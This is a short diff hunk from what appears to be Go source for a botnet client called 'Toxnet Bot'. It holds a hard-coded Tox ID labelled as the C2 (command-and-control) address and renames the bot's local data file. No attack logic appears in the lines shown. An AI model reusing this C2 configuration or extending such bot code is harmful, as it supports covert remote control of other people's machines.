@@ -24,7 +24,7 @@ var server = []interface{}{
 }
 
 var address = "2F4BE3E7E9BB1CA7F107EC8371DCB847202013B2BDC824B2111F12493190E67A727C0864E9E3" // C2 Address
-var fname = "./tox.data"
+var fname = "./client.data"
 var nickPrefix = "client"
 var statusText = "Toxnet Bot."
 
